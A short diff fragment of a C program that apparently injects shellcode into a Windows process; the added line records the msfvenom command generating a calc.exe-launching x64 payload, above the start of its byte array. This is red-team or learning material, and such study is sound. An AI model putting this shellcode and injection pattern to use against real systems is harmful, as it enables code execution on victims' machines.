@@ -5,6 +5,7 @@
 #include <tlhelp32.h>
 
 // msfvenom shellcode to execute 64-bit calc.exe
+// msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
 unsigned char payload[] =
     "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
     "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
